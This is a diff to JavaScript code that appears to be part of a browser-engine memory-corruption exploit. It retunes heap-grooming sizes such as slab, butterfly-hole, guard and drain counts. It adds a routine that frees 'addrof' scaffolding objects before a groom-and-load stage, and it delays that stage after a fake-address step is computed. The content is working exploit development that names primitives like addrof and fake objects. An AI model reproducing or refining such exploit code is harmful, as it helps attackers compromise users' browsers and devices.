@@ -1,4 +1,4 @@
-let DRAIN_COUNT = 192;
+let DRAIN_COUNT = 128;
 const AUTO_RETRY_DELAY_MS = 50;
 
 const K = 2;
@@ -43,13 +43,13 @@ const _g = (name, dflt) => (typeof _gOverride[name] === "number" ? _gOverride[na
 if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
 
 const DRAIN_SIZE = _g("drainsz", 0x8000);
-const SLAB_SIZE = _g("slab", 0x200000);
-const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x50000);
-const SEPARATOR_SIZE = _g("sep", 0x8000);
-const EARLY_HOLE_SIZE = _g("early", 0x40000);
-const GUARD_SIZE = _g("guard", 0x50000);
-const PREDECESSOR_SIZE = _g("pred", 0x50000);
-const FINAL_HOLE_SIZE = _g("final", 0x50000);
+const SLAB_SIZE = _g("slab", 0x100000);
+const BUTTERFLY_HOLE_SIZE = _g("bfly", 0x40000);
+const SEPARATOR_SIZE = _g("sep", 0x4000);
+const EARLY_HOLE_SIZE = _g("early", 0x30000);
+const GUARD_SIZE = _g("guard", 0x40000);
+const PREDECESSOR_SIZE = _g("pred", 0x40000);
+const FINAL_HOLE_SIZE = _g("final", 0x40000);
 
 const RW_BUFFER_SIZE = 0x100;
 
@@ -1046,6 +1046,15 @@ function defaultCriticalBarrier(fake, target) {
     } catch { }
 }
 
+function releaseAddrofScaffolding() {
+    getterCarrier = null;
+    preparedSymbolObject = null;
+    leakedScope = null;
+    capturedString = null;
+    capturedWords = null;
+    emit("ADDROF-RELEASE", "12M-carrier+wrapper freed-before-groom");
+}
+
 function beginComposition() {
     if (captureState === 0) {
         finishEarlySafeAttempt("ADDROF-NO-RESULT",
@@ -1105,7 +1114,8 @@ function beginComposition() {
     }
     emit("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}`
         + "-delta=0x10");
-    runGroomAndLoad();
+    releaseAddrofScaffolding();
+    setTimeout(runGroomAndLoad, 32);
 }
 
 function reportComposition() {
